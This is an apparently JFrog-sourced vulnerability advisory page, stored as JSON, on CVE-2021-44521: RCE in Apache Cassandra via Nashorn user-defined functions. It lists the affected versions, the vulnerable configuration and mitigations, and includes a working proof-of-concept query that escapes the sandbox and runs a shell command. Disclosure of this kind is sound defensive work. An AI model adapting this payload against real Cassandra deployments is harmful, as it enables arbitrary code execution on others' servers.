{"hash":"5dc7ac781f71806b0d04ecfee4693bb509a5512d","data":{"post":{"title":"Cassandra UDF RCE","path":"/vulnerabilities/cassandra-udf-rce-197962/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>Insufficient sandboxing of user-defined functions in Apache Cassandra leads to remote code execution</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://cassandra.apache.org/_/index.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Apache Cassandra</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>[3.0.0-alpha1, 3.0.25], fixed in 3.0.26</p>\n<p>[3.1, 3.11.11], fixed in 3.11.12</p>\n<p>[4.0-alpha1, 4.0.1], fixed in 4.0.2</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>CVE-2021-44521 is an RCE (remote code execution) issue in Apache Cassandra. This Apache vulnerability is easy to exploit and has the potential to wreak havoc on systems, but luckily only manifests in non-default configurations of Cassandra.  </p>\n<p>Cassandra deployments are vulnerable to CVE-2021-44521 when the cassandra.yaml configuration file contains the following definitions:</p>\n<pre><code>enable_user_defined_functions: true\nenable_scripted_user_defined_functions: true\nenable_user_defined_functions_threads: false\n</code></pre>\n<p>A malicious authenticated user can run a trivial (publicly available) SQL query that causes remote code execution, by running JavaScript code in the query that abuses the JavaScript engine (Nashorn) and escapes the security sandbox</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code>create or replace function x.escape_system(name text) RETURNS NULL ON NULL INPUT RETURNS text LANGUAGE javascript AS $$\nvar System = Java.type(\"java.lang.System\");System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(\"touch hacked\")');name $$;\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<ol>\n<li>If UDFs are not actively used, they can be completely disabled by setting <code>enable_user_defined_functions</code> to <code>false</code> (which is the default value)</li>\n<li>If UDFs are needed, set <code>enable_user_defined_functions_threads</code> to <code>true</code> (which is the default value)</li>\n<li>Remove the permissions of creating, altering and executing functions for untrusted users by removing the following permissions: <code>ALL FUNCTIONS</code>, <code>ALL FUNCTIONS IN KEYSPACE</code> and <code>FUNCTION</code> for <code>CREATE</code>, <code>ALTER</code> and <code>EXECUTE</code> queries (<a href=\"https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">see blog post for example query</a>)</li>\n</ol>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">(JFrog) CVE-2021-44521: RCE Vulnerability in Apache Cassandra</a></p>\n<p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-44521\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">NVD</a></p>\n","description":"CVE-2021-44521 High severity. Insufficient sandboxing of user-defined functions in Apache Cassandra leads to remote code execution","date_published":"2022-02-15","xray_id":"XRAY-197962","vul_id":"CVE-2021-44521","severity":"high","discovered_by":"Omer Kaspi","last_updated":"2022-02-15","cvss":8.4}},"context":{}}